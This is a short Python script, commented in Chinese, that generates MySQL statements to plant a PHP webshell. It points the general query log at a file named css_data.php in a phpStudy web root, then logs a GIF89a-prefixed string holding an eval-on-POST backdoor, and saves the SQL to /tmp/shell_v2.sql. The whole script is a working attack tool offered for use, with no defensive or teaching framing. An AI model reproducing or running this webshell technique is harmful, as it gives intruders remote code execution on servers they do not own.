#!/usr/bin/env python3
"""gen_shell_v2.py - 生成带eval的webshell SQL(文件方式,无bash转义)"""
shell_body = "<?php @eval($_POST['x']);echo 'OK';?>"

for name in ['css_data.php']:
    sql = []
    sql.append("SET GLOBAL general_log = OFF;")
    sql.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/%s';" % name)
    sql.append("SET GLOBAL general_log = ON;")
    sql.append("SELECT 'GIF89a%s//'" % shell_body)
    sql.append("SET GLOBAL general_log = OFF;")
    with open('/tmp/shell_v2.sql', 'w') as f:
        f.write('\n'.join(sql) + '\n')
print('ready')
